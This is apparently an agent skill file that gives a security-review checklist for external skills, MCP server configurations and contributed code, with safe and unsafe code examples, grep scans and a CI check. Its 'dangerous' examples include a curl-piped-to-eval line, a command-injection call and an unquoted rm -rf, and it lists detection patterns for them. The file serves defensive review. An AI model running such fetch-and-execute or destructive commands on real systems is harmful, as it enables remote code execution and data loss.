---
name: skill-security-auditor
description: 'Security audit for external code and skill content. Use when: reviewing external skill files, checking code snippets from untrusted sources, validating MCP tool configurations, accepting contributions from external repos.'
---

# Skill Security Auditor

## When to Use

- Reviewing skill content from external repositories
- Validating code snippets before incorporating
- Checking MCP server configurations
- Auditing contributed code for security issues
- Verifying no malicious patterns in automation scripts

## Security Review Checklist

### File-level Review

1. **No embedded credentials**
   - API keys, passwords, tokens
   - Database connection strings
   - Private keys or certificates

2. **No network exfiltration**
   - Unexpected outbound requests
   - Data sent to unknown endpoints
   - Hidden telemetry

3. **No file system abuse**
   - Writes outside project directory
   - Reads sensitive system files
   - Permission modifications

4. **No process execution risks**
   - Arbitrary command execution
   - Shell injection vectors
   - Subprocess without sanitization

### Code Patterns to Flag

```python
# DANGEROUS: Command injection
os.system(f"curl {user_input}")  # ❌
subprocess.run(user_input, shell=True)  # ❌

# SAFE: Parameterized
subprocess.run(["curl", validated_url], shell=False)  # ✅

# DANGEROUS: Path traversal
open(f"data/{user_filename}")  # ❌

# SAFE: Validate path
import pathlib
safe_path = pathlib.Path("data") / user_filename
if safe_path.resolve().is_relative_to(pathlib.Path("data").resolve()):
    open(safe_path)  # ✅
```

### Shell Script Review

```bash
# DANGEROUS: Eval of external content
eval "$(curl -s https://example.com/script)"  # ❌

# DANGEROUS: Unquoted variables
rm -rf $USER_PATH/*  # ❌

# SAFE: Quoted variables
rm -rf "${USER_PATH:?}"/*  # ✅
```

## MCP Server Validation

### Configuration Review

```json
{
  "mcpServers": {
    "untrusted-server": {
      "command": "npx",
      "args": ["untrusted-package"]  // ⚠️ Review package source
    }
  }
}
```

### MCP Red Flags

- Servers requesting filesystem access beyond project
- Network access to unknown domains
- Servers bundling native executables
- Missing source code availability
- No version pinning

## External Skill Review Process

### Step 1: Source Verification

```bash
# Verify repository ownership
gh repo view owner/repo --json owner,isPrivate,url

# Check recent commits
git log --oneline -20

# Review contributors
gh api repos/owner/repo/contributors
```

### Step 2: Content Scan

```bash
# Search for dangerous patterns
grep -rE "(eval|exec|system|subprocess|curl.*\|.*sh)" .

# Find credential patterns
grep -rE "(password|api_key|secret|token)\s*=" .

# Check for encoded content
grep -rE "base64|atob|btoa" .
```

### Step 3: Dependency Check

- Review any `requirements.txt` or `package.json`
- Check for known vulnerable versions
- Verify dependency sources

## Approval Criteria

### Accept When

- ✅ No credential exposure
- ✅ No arbitrary code execution
- ✅ No external network calls without justification
- ✅ Clear, readable code
- ✅ Documented purpose
- ✅ Verifiable source

### Reject When

- ❌ Obfuscated or minified code
- ❌ Encoded payloads
- ❌ Unexplained external calls
- ❌ File operations outside scope
- ❌ Privilege escalation patterns
- ❌ Missing or suspicious provenance

## Anti-patterns

- **Blind trust**: Copying code without review
- **Review fatigue**: Skipping long files
- **Version drift**: Not reviewing updates
- **Scope creep**: Accepting more permissions than needed

## Integration

Add security review as a PR requirement:

```yaml
name: Security Review

on:
  pull_request:
    paths:
      - '.github/skills/**'
      - '.github/agents/**'

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Scan for dangerous patterns
        run: |
          if grep -rE "(eval|exec|os\.system)" .github/; then
            echo "::error::Dangerous pattern detected"
            exit 1
          fi
```
